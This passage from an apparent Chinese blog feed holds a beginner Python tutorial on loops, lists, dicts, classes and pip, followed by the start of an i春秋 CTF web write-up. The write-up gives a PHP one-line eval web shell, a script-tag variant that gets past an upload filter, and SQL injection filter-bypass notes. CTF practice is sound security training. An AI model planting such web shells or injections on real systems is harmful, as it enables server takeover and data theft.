src="https://img-blog.csdnimg.cn/20191125122930346.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h4 id="4、循环（Loop"><a href="#4、循环（Loop" class="headerlink" title="4、循环（Loop)"></a>4、循环（Loop)</h4><ul><li>for 循环<br>例：</li></ul><pre><code class="csharp">for every_letter in &#39;Hello world&#39;:    print(every_letter)</code></pre><p>得到这样的结果：</p><pre><code class="csharp">Helloworld</code></pre><p>解释：</p><ul><li><p>for 是关键词，后面的为变量名称，至于变量起什么名字自己定，但不要和关键词重名。</p></li><li><p>在关键词 in 后面所对应的一定是具有“可迭代的”，或者说是像列表那样的集合形态的对象，即可以连续地提供其中的每一个元素的对象。</p></li></ul><p><img src="https://img-blog.csdnimg.cn/2019112519354257.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了更深入了解 for 循环，我们来举个例子：</p><pre><code class="csharp">for num in range(1,11): #不包含11，因此实际范围是1～10    print(str(num) + &#39; + 1 =&#39;,num + 1)</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20191125200619272.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这里用到了内置函数一<code>range</code>。我们只需要在 <code>range</code> 函数后面的括号中填上数字，就可以得到一个具有连续整数的序列。</p><p><strong>把 for 和 if 结合起来使用</strong><br>代码如下：</p><pre><code class="csharp">songslist = [&#39;Holy Diver&#39;, &#39;Thunderstruck&#39;, &#39;Rebel Rebel&#39;]for song in songslist:    if song == &#39;Holy Diver&#39;:        print(song,&#39; - Dio&#39;)    elif song == &#39;Thunderstruck&#39;:        print(song,&#39; - AC/DC&#39;)    elif song == &#39;Rebel Rebel&#39;:        print(song,&#39; - David Bowie&#39;)</code></pre><p>实现了这样一个功能：歌曲列表中有三首歌“Holy Diver, Thunderstruck, Rebel Rebel”，当播放到每首时，分别显示对应的歌手名字“Dio, AC/DC, David Bowie”。</p><h5 id="5、嵌套循环"><a href="#5、嵌套循环" class="headerlink" title="5、嵌套循环"></a>5、嵌套循环</h5><p>打印九九乘法表：<br>还记得当初学C语言的时候打印一个九九乘法表需要的代码起码有十几二十行吧，但是在python里却只需要三行！！</p><pre><code class="csharp">for i in range(1,10):    for j in range(1,10):        print(&#39;&#123;&#125; X &#123;&#125; = &#123;&#125;&#39;.format(i,j,i*j))</code></pre><p>运行结果：<br><img src="https://img-blog.csdnimg.cn/20191125201915323.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="6、While-循环"><a href="#6、While-循环" class="headerlink" title="6、While 循环"></a>6、While 循环</h5><p>语法：<br><img src="https://img-blog.csdnimg.cn/20191125202121359.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>用法就不举例了。</p><h3 id="第六节：数据结构"><a href="#第六节：数据结构" class="headerlink" title="第六节：数据结构"></a>第六节：数据结构</h3><p> 正如在现实世界中一样，直到我们拥有足够多的东西，才迫切需要一个储存东西的容器，这些储存大量数据的容器，在 Python 称之为内置数据结构。<br> Python 有四种数据结构，分别是：列表、字典、元组，集合。每种数据结构都有自己的特点，并且都有着独到的用处。<br><img src="https://img-blog.csdnimg.cn/20200411182121977.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="1、列表（list"><a href="#1、列表（list" class="headerlink" title="1、列表（list)"></a>1、列表（list)</h5><p>先从列表开始，列表具有的最显著的特征是：</p><ul><li>列表中的每一个元素都是可变的；</li><li>列表中的元素是有序的，也就是说每一个元素都有一个位置；</li><li>列表可以容纳 Python 中的任何对象。</li><li>列表中的元素是可变的，这意味着我们可以在列表中添加、删除和修改元素。</li></ul><p>列表中的每一个元素都对应着一个位置，我们通过输入位置而查询该位置所对应的值，试着输入：</p><pre><code class="csharp">Weekday = [&#39;Monday&#39;,&#39;Tuesday&#39;,&#39;Wednesday&#39;,&#39;Thursday&#39;,&#39;Friday&#39;]print(Weekday[0])</code></pre><p>结果为；<br><img src="https://img-blog.csdnimg.cn/20200411215338220.png" alt="在这里插入图片描述"><br>第三个特征是列表可以装入 Python 中所有的对象：</p><pre><code class="csharp">all_in_list = [    1,                              #整数    1.0,                            #浮点数    &#39;a word&#39;,                       #字符串    print(1),                       #函数    True,                           #布尔值    [1,2],                          #列表中套列表    (1,2),                          #元组    &#123;&#39;key&#39;:&#39;value&#39;&#125;                 #字典]for all in all_in_list:    print(all)</code></pre><p>结果为:<br><img src="https://img-blog.csdnimg.cn/20200411215257461.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><p><strong>列表的增删改查</strong>：</p><p>对于数据的操作，最常见的是增删改查这四类。从列表的<strong>插入</strong>方法开始，输入：</p><pre><code class="csharp">fruit = [&#39;pineapple&#39;,&#39;pear&#39;]fruit.insert(1,&#39;grape&#39;)print(fruit)</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200411215202749.png" alt="在这里插入图片描述"><br><strong>删除</strong>列表中元素的方法是使用 remove()：</p><pre><code class="csharp">fruit = [&#39;pinapple&#39;,&#39;pear&#39;,&#39;grape&#39;]fruit.remove(&#39;grape&#39;)</code></pre><p>删除还有一种方法，那就是使用 del 关键字来声明：</p><pre><code class="csharp">del fruit[0:2]</code></pre><p>想替换<strong>修改</strong>其中的元素可以这样：</p><pre><code class="csharp">fruit[0] = &#39;Grapefruit&#39;</code></pre><p>列表的索引与字符串的分片相似，同样是分正反两种索引方式，只要输入对应的位置就会返回给你在这个位置上的值：</p><p><img src="https://img-blog.csdnimg.cn/20200411220748460.png" alt="在这里插入图片描述"><br>用元素周期表来试验一下：</p><pre><code class="csharp">periodic_table = [&#39;H&#39;,&#39;He&#39;,&#39;Li&#39;,&#39;Be&#39;,&#39;B&#39;,&#39;C&#39;,&#39;N&#39;,&#39;O&#39;,&#39;F&#39;,&#39;Ne&#39;]print(periodic_table[0])print(periodic_table[-2])print(periodic_table[0:3])print(periodic_table[-10:-7])print(periodic_table[-10:]) print(periodic_table[:9])</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200411221629527.png" alt="在这里插入图片描述"><br>如果要是反过来，想要查看某个具体的值所在的位置，就需要用别的方法了，否则就会报错，这是因为列表只接受用位置进行索引，但如果数据量很大的话，肯定会记不住什么元素在什么位置，那么有没有一种数据类型可以用人类的方式来进行索引呢？其实这就是字典，我们一起来继续学习。</p><h5 id="2、字典（Dictionary"><a href="#2、字典（Dictionary" class="headerlink" title="2、字典（Dictionary)"></a>2、字典（Dictionary)</h5><p>字典这种数据结构的特征也正如现实世界中的字典一样，使用名称－内容进行数据的构建，在 Python 中分别对应着键（key）－ 值（value），习惯上称之为键值对。<br>字典的特征总结如下：</p><ul><li><p>字典中数据必须是以键值对的形式出现的；</p></li><li><p>逻辑上讲，键是不能重复的，而值可以重复；</p></li><li><p>字典中的键（key）是不可变的，也就是无法修改的；而值（value）是可变的，可修改的，可以是任何对象。</p><p>用下面这个例子来看一下，这是字典的书写方式：</p></li></ul><pre><code class="csharp">NASDAQ_code = &#123;    &#39;BIDU&#39;:&#39;Baidu&#39;,    &#39;SINA&#39;:&#39;Sina&#39;,    &#39;YOKU&#39;:&#39;Youku&#39;&#125;</code></pre><p>字典中的键与值必须是成对的！<br>同时字典中的键值不会有重复，即便你这么做，相同的键值也只能出现一次：</p><pre><code class="csharp">a = &#123;&#39;key&#39;:123,&#39;key&#39;:1234&#125;print(a)</code></pre><p><img src="https://img-blog.csdnimg.cn/2020041123171936.png" alt="在这里插入图片描述"><br><strong>字典的增删改查</strong>：<br>创建一个字典，继续使用前面的例子：</p><pre><code class="csharp">NASDAQ_code = &#123;&#39;BIDU&#39;:&#39;Baidu&#39;,&#39;SINA&#39;:&#39;Sina&#39;&#125;</code></pre><p>与列表不同的是，字典并没有一个可以往里面添加单一元素的“方法”，但是我们可以通过这种方式进行<strong>添加</strong>：</p><pre><code class="csharp">NASDAQ_code[&#39;YOKU&#39;] = &#39;Youku&#39;print(NASDAQ_code）</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200411232205779.png" alt="在这里插入图片描述"><br>列表中有用来<strong>添加多个</strong>元素的方法 <code>extend()</code> ，在字典中也有对应的添加多个元素的方法 <code>update()</code>：</p><pre><code class="csharp">NASDAQ_code.update(&#123;&#39;FB&#39;:&#39;Facebook&#39;,&#39;TSLA&#39;:&#39;Tesla&#39;&#125;)</code></pre><p>删除字典中的元素则使用 <strong>del</strong> 方法：</p><pre><code class="csharp">del NASDAQ_code[&#39;FB&#39;]</code></pre><p>需要注意的是，虽说字典是使用的花括号，在索引内容的时候仍旧使用的是和列表一样的方括号进行索引，只不过在括号中放入的一定是字典中的键，也就是说需要通过键来索引值：</p><pre><code class="csharp">NASDAQ_code[&#39;TSLA&#39;]</code></pre><p>同时，字典是不能够切片的，也就是说下面这样的写法应用在字典上是错误的：</p><pre><code class="csharp">chart[1:4]  # WRONG!</code></pre><h5 id="3、元组（Tuple"><a href="#3、元组（Tuple" class="headerlink" title="3、元组（Tuple)"></a>3、元组（Tuple)</h5><p>元组其实可以理解成一个稳固版的列表，因为元组是不可修改的，因此在列表中的存在的方法均不可以使用在元组上，但是元组是可以被查看索引的，方式就和列表一样：</p><pre><code class="csharp">letters = (&#39;a&#39;,&#39;b&#39;,&#39;c&#39;,&#39;d&#39;,&#39;e&#39;,&#39;f&#39;,&#39;g&#39;)letter[0]</code></pre><h6 id="4、集合（Set"><a href="#4、集合（Set" class="headerlink" title="4、集合（Set)"></a>4、集合（Set)</h6><p>集合则更接近数学上集合的概念。每一个集合中的元素是无序的、不重复的任意对象，我们可以通过集合去判断数据的从属关系，有时还可以通过集合把数据结构中重复的元素减掉。</p><ul><li>集合不能被切片也不能被索引，除了做集合运算之外，集合元素可以被添加还有删除：<pre><code class="csharp">a_set = &#123;1,2,3,4&#125;                                              a_set.add(5) #添加a_set.discard(5) #删除</code></pre><h5 id="5、数据结构的一些技巧"><a href="#5、数据结构的一些技巧" class="headerlink" title="5、数据结构的一些技巧"></a>5、数据结构的一些技巧</h5>有很多函数的用法和数据结构的使用是息息相关的。前面我们学习了列表的基本用法，而在实际操作中往往会遇到更多的问题。比如，在整理表格或者文件的时候会按照字母或者日期进行排序，在 Python 中也存在类似的功能：</li></ul><pre><code class="csharp">num_list = [6,2,7,4,1,3,5]print(sorted(num_list))</code></pre><p>结果：<br><img src="https://img-blog.csdnimg.cn/20200411234053636.png" alt="在这里插入图片描述"><br><code>sorted</code> 函数按照<strong>长短</strong>、<strong>大小</strong>、英文字母的<strong>顺序</strong>给每个列表中的元素进行排序。这个函数会经常在数据的展示中使用，其中有一个非常重要的地方，sorted 函数并不会改变列表本身，你可以把它理解成是先将列表进行复制，然后再进行顺序的整理。</p><ul><li>在使用默认参数 reverse 后列表可以被按照逆序整理：</li></ul><pre><code class="csharp">sorted(num_list,reverse=True)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200411234245265.png" alt="在这里插入图片描述"><br><strong>推导式</strong>：<br>现在我们来看数据结构中的推导式（List comprehension），也许你还看到过它的另一种名称叫做列表的解析式，在这里你只需要知道这两个说的其实是一个东西就可以了。</p><p>现在我有10个元素要装进列表中，普通的写法是这样的：</p><pre><code class="csharp">a = []for i in range(1,11):    a.append(i) #append函数会在数组后加上相应的元素</code></pre><p>下面换成列表解析的方式来写：</p><pre><code class="csharp">b = [i for i in range(1,11)]</code></pre><p>列表解析式不仅非常方便，并且在执行效率上要远远胜过前者，我们把两种不同的列表操作方式所耗费的时间进行对比，就不难发现其效率的巨大差异：</p><pre><code class="csharp">import timea = []t0 = time.clock()for i in range(1,20000):    a.append(i)print(time.clock() - t0, seconds process time&quot;)t0 = time.clock()b = [i for i in range(1,20000)]print(time.clock() - t0, seconds process time&quot;)得到结果：</code></pre><pre><code class="csharp">8.999999999998592e-06 seconds process time0.0012320000000000005 seconds process time</code></pre><p>列表推导式的用法也很好理解，可以简单地看成两部分。红色虚线后面的是我们熟悉的 for 循环的表达式，而虚线前面的可以认为是我们想要放在列表中的元素，在这个例子中放在列表中的元素即是后面循环的元素本身。<br><img src="https://img-blog.csdnimg.cn/20200411235925460.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>为了更好地理解这句话，我们继续看几个例子：</p><pre><code class="csharp">a = [i**2 for i in range(1,10)]c = [j+1 for j in range(1,10)]k = [n for n in range(1,10) if n % 2 ==0]z = [letter.lower() for letter in &#39;ABCDEFGHIGKLMN&#39;]</code></pre><p>字典推导式的方式略有不同，主要是因为创建字典必须满足键－值的两个条件才能达成：</p><pre><code class="csharp">d = &#123;i:i+1 for i in range(4)&#125;g = &#123;i:j for i,j in zip(range(1,6),&#39;abcde&#39;)&#125;g = &#123;i:j.upper() for i,j in zip(range(1,6),&#39;abcde&#39;)&#125;</code></pre><p><strong>循环列表时获取元素的索引</strong><br>现在我们有一个字母表，如何能像下图中一样，在索引的时候得到每个元素的具体位置的展示呢？</p><pre><code class="csharp">letters = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;]</code></pre><p><img src="https://img-blog.csdnimg.cn/2020041200040212.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>前面提到过，列表是有序的，这时候我们可以使用 Python 中独有的函数 <code>enumerate</code> 来进行：</p><pre><code class="csharp">letters = [&#39;a&#39;, &#39;b&#39;, &#39;c&#39;, &#39;d&#39;, &#39;e&#39;, &#39;f&#39;, &#39;g&#39;]for num,letter in enumerate(letters):    print(letter,&#39;is&#39;,num + 1)</code></pre><p>如果同时需要两个列表应该怎么办？这时候就可以用到 <code>zip</code> 函数，比如：</p><pre><code class="csharp">a=[1,2,3]b=[&#39;x&#39;,&#39;y&#39;,&#39;z&#39;]for a,b in zip(str,num):    print(b,&#39;is&#39;,a)</code></pre><p><img src="https://img-blog.csdnimg.cn/202004121313258.png" alt="在这里插入图片描述"></p><h3 id="第七节：类"><a href="#第七节：类" class="headerlink" title="第七节：类"></a>第七节：类</h3><p>Python的类和C++/java 的类定义方法基本相同，但在声明对象是略有不同，Python把对象的声明进一步简化了。<br>例：</p><p>定义类：</p><pre><code class="csharp">class CocaCola:    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]</code></pre><p>声明对象：</p><pre><code class="csharp">coke_for_me = CocaCola()</code></pre><p>调用：</p><pre><code class="csharp">print(CocaCola.formula)print(coke_for_me.formula)print(coke_for_you.formula)</code></pre><p>结果为：</p><pre><code class="csharp">&gt;&gt;&gt; [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]&gt;&gt;&gt; [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]&gt;&gt;&gt; [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]</code></pre><p>Python 支持直接使用类来调用方法，而java中必须是静态的方法才能使用类进行直接调用。</p><p>类的属性与正常的变量并无区别：</p><pre><code class="csharp">for element in coke_for_me.formula:    print(element)</code></pre><p>运行结果：</p><pre><code class="csharp">&gt;&gt;&gt; caffeine&gt;&gt;&gt; sugar&gt;&gt;&gt; water&gt;&gt;&gt; soda</code></pre><p>和java里的类相同，Python的类有属性，方法等等…这里就不详细记录了。</p><p>例子：</p><pre><code class="csharp">class CocaCola:    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]    def drink(self,how_much):              if how_much == &#39;a sip&#39;:            print(&#39;Cool~&#39;)        elif how_much == &#39;whole bottle&#39;:            print(&#39;Headache!&#39;)       ice_coke = CocaCola()ice_coke.drink(&#39;a sip&#39;)</code></pre><p>运行结果：</p><pre><code class="csharp">&gt;&gt;&gt; Cool~</code></pre><h5 id="2、魔术方法："><a href="#2、魔术方法：" class="headerlink" title="2、魔术方法："></a>2、魔术方法：</h5><p> Python 的类中存在一些方法，被称为”魔术方法”，<code>_init_()</code> 就是其中之一。<br> <code>_init()</code>是 <code>initialize(初始化)</code>的缩写，这也就意味着即使我们在创建实例的时候不去引用 <code>init_()</code>方法，其中的命令也会先被自动地执行。<br><code>_init()</code> 的神奇之处就在于，如果你在类里定义了它，在创建实例的时候它就能帮你自动地处理很多事情——比如新增实例属性。在上面的代码中，我们创建了一个实例属性，但那是在定义完类之后再做的，这次我们一步到位：</p><pre><code class="csharp">class CocaCola():    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]    def __init__(self):        self.local_logo = &#39;可口可乐&#39;     def drink(self):    # HERE！        print(&#39;Energy!&#39;)        coke = CocaCola()print(coke.local_logo)</code></pre><p>运行结果：</p><pre><code class="csharp">&gt;&gt;&gt; 可口可乐</code></pre><p><code>_init_()</code> 方法可以给类的使用提供极大的灵活性。试试看下面的代码会发生什么：</p><pre><code class="csharp">class CocaCola:    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]    def __init__(self):        for element in self.formula:            print(&#39;Coke has &#123;&#125;!&#39;.format(element))coke = CocaCola()</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200412162907530.png" alt="在这里插入图片描述"><br>除了必写的<code>self</code> 参数之外，<code>_init()</code> 也有自己的参数，同时也不需要这样<code>obj.init()</code>的方式来调用（因为是自动执行），而是在实例化的时候往类后面的括号中放进参数，相应的所有参数都会传递到这个特殊的 <code>init_()</code> 方法中，和函数的参数的用法完全相同。</p><pre><code class="csharp">class CocaCola:    formula = [&#39;caffeine&#39;,&#39;sugar&#39;,&#39;water&#39;,&#39;soda&#39;]    def __init__(self,logo_name):        self.local_logo = logo_name    def drink(self):        print(&#39;Energy!&#39;)coke = CocaCola(&#39;可口可乐&#39;)print(coke.local_logo)</code></pre><p>结果为：<br><img src="https://img-blog.csdnimg.cn/20200412164301434.png" alt="在这里插入图片描述"></p><h5 id="3、类的继承"><a href="#3、类的继承" class="headerlink" title="3、类的继承"></a>3、类的继承</h5><p>python中类的继承也比java更加简洁。<br><strong>例：</strong></p><pre><code class="csharp">class CaffeineFree(CocaCola):    caffeine = 0                           #覆盖    ingredients =  [                       #覆盖        &#39;High Fructose Corn Syrup&#39;,        &#39;Carbonated Water&#39;,        &#39;Phosphoric Acid&#39;,        &#39;Natural Flavors&#39;,        &#39;Caramel Color&#39;,    ]coke_a = CaffeineFree(&#39;Cocacola-FREE&#39;)       # 传入初始化参数coke_a.drink()</code></pre><p>在新的类 CaffeineFree 后面的括号中放入 CocaCola，这就表示这个类是继承于 CocaCola 这个父类的， CaffeineFree 就成为了 CocaCola 子类。类中的变量和方法可以完全被子类继承，但如需有特殊的改动也可以进行覆盖。</p><h5 id="4、类属性与实例属性"><a href="#4、类属性与实例属性" class="headerlink" title="4、类属性与实例属性"></a>4、类属性与实例属性</h5><p>Q1：类属性如果被重新赋值，是否会影响到类属性的引用？</p><pre><code class="python">class TestA:    attr = 1obj_a = TestA()TestA.attr = 42print(obj_a.attr)</code></pre><p>结果：<br><img src="https://img-blog.csdnimg.cn/20200412224324884.png" alt="在这里插入图片描述"><br>Q2：实例属性如果被重新赋值，是否会影响到类属性的引用？</p><pre><code class="python">class TestA:    attr = 1obj_a = TestA()obj_b = TestA()obj_a.attr = 42print(obj_b.attr)</code></pre><p>结果：<br><img src="https://img-blog.csdnimg.cn/20200412224352282.png" alt="在这里插入图片描述"></p><p>Q3：类属性实例属性具有相同的名称，那么 <code>.</code> 后面引用的将会是什么？</p><pre><code class="python">class TestA:    attr = 1    def __init__(self):        self.attr = 42obj_a = TestA()print(obj_a.attr)</code></pre><p><img src="https://img-blog.csdnimg.cn/20200412225347119.png" alt="在这里插入图片描述"><br><strong>解释</strong>：<br>如图所示， Python 中属性的引用机制是自外而内的，当你创建了一个实例之后，准备开始引用属性，这时候编译器会先搜索该实例是否拥有该属性，如果有，则引用；如果没有，将搜索这个实例所属的类是否有这个属性，如果有，则引用，没有那就只能报错了。<br><img src="https://img-blog.csdnimg.cn/20200412225631372.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="第七节：使用第三方库"><a href="#第七节：使用第三方库" class="headerlink" title="第七节：使用第三方库"></a>第七节：使用第三方库</h3><p>如果用手机来比喻编程语言，那么 Python 是一款智能机。而海量的第三方库就是各种各样的app，丰富的第三方库为 Python 开发提供了极大的便利。</p><p><strong>安装 pip</strong>:<br>在 Python 3.4 之后，安装好 Python 环境就可以直接支持 pip，你可以在终端/命令行里输入这句检查一下：</p><pre><code class="python">pip -version</code></pre><p>如果显示了 pip 的版本，就说明 pip 已经成功安装了。</p><p><strong>使用 pip 安装库</strong>:</p><p>在安装好 pip 之后，以后安装库，只需要在命令行里面输入：</p><pre><code class="python">pip3 install PackageName</code></pre><blockquote><p>注：PackageName 需要替换成你要安装的库的名称；如果你想安装到 python 2中，需要把 pip3 换成 pip。</p></blockquote><p>如果你安装了 python 2和3两种版本，可能会遇到安装目录的问题，可以换成:</p><pre><code class="python">python3 -m pip install PackageName</code></pre><blockquote><p>注：在存在多个 Python 版本的环境中，加上<code>python3 -m</code>这种写法可以精确地控制三方库的安装位置如果你想安装到 python 2中，需要把 python3 换成 python</p></blockquote><p>如果遇到权限问题，可以输入：</p><pre><code class="python">sudo pip install PackageName</code></pre><p>安装成功后会提示：</p><pre><code class="python">Successfully installed PackageName</code></pre><p>几个 pip 的常用指令：</p><pre><code class="python">pip install -upgrade pip                  #升级 pippip uninstall flask                       #卸载库pip list                                  #查看已安装库</code></pre><p>🆗，Python的基础学习就到这了，想要学好Python一定要多加练习！</p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>i春秋做题记录 web(一)</title>
      <link href="2019/11/03/i%E6%98%A5%E7%A7%8B%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%20web(%E4%B8%80)/"/>
      <url>2019/11/03/i%E6%98%A5%E7%A7%8B%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95%20web(%E4%B8%80)/</url>
      
        <content type="html"><![CDATA[<p>前言：<br>时间过的真快呀，一转眼半学期就过去了(￣m￣）；攻防世界上的题差不多刷完了(剩下的都是不会的T_T)，这周就来做做 i春秋的题，顺便记录下。<hr></p><a id="more"></a><h3 id="1、想怎么传就怎么传，就是这么任性。"><a href="#1、想怎么传就怎么传，就是这么任性。" class="headerlink" title="1、想怎么传就怎么传，就是这么任性。"></a>1、想怎么传就怎么传，就是这么任性。</h3><p>题型：    Web Upload<br><img src="http://img-blog.csdnimg.cn/20191030162630590.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>这题就是一个简单的文件上传题目；先用一个普通的php小马试一下：<code>&lt;?php @eval($_POST[&#39;smk&#39;]);?&gt;</code><br>然后发现文件是上传成功了，但是<code>&lt;? php</code>被过滤掉了<br>于是在网上找到另一个一句话，将php用大写绕过 修改后如下：<br><code>&lt;script language=&quot;pHp&quot;&gt;@eval($_POST[&#39;smk&#39;])&lt;/script&gt;</code><br>然后连接菜刀就能看到flag了。<br><img src="http://img-blog.csdnimg.cn/20191103172707128.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="2、出题人就告诉你这是个注入，有种别走！"><a href="#2、出题人就告诉你这是个注入，有种别走！" class="headerlink" title="2、出题人就告诉你这是个注入，有种别走！"></a>2、出题人就告诉你这是个注入，有种别走！</h3><p>题型：    Web Sql<br><img src="http://img-blog.csdnimg.cn/20191030162853663.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目：<br><img src="http://img-blog.csdnimg.cn/20191103162535997.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>看到题目的url就知道要对id注入。首先试一下order by，发现错误，可能是关键字过滤。试了试<code>/**/</code>还是不行，改用<code>&lt;&gt;</code>发现可以了，如图：<br><img src="http://img-blog.csdnimg.cn/2019110316284923.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>测试得字段数为3，接下来就没啥好说的了，按顺序，爆库爆表爆字段<br><img src="http://img-blog.csdnimg.cn/20191103163918156.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103164216508.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103164928944.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20191103165117879.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>得到flag。</p><h3 id="3、这个真的是爆破。"><a href="#3、这个真的是爆破。" class="headerlink" title="3、这个真的是爆破。"></a>3、这个真的是爆破。</h3><p>题型：Misc    Web<br><img src="http://img-blog.csdnimg.cn/20191030195146808.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNTMxNjY5,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>打开题目，看到一段php语句：</p><pre><code>error_reporting(0);// 关闭错误报告session_start();//启动会话require(&#39;./flag.php&#39;);if(!isset($_SESSION[&#39;nums&#39;]))&#123;//isset() — 检测变量是否设置。  $_SESSION[&#39;nums&#39;] = 0;  $_SESSION[&#39;time&#39;] = time();//返回当前时间的 Unix 时间戳  $_SESSION[&#39;whoami&#39;] = &#39;ea&#39;;&#125;if($_SESSION[&#39;time&#39;]+120&lt;time())&#123;  session_destroy();//session_destroy — 销毁一个会话中的全部数据&#125;//120s后会话结束$value = $_REQUEST[&#39;value&#39;];$str_rand = range(&#39;a&#39;, &#39;z&#39;);//range创建一个包含从 &quot;a&quot; 到 &quot;z&quot; 之间的元素范围的数组$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)];//mt_rand() 使用 Mersenne Twister 算法返回0到25之间的随机整数。$str_rand[mt_rand(0,25)]返回&quot;a&quot; 到 &quot;z&quot;之间任意字母。$str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]是两任意字母相连if($_SESSION[&#39;whoami&#39;]==($value[0].$value[1]) &amp;&amp; 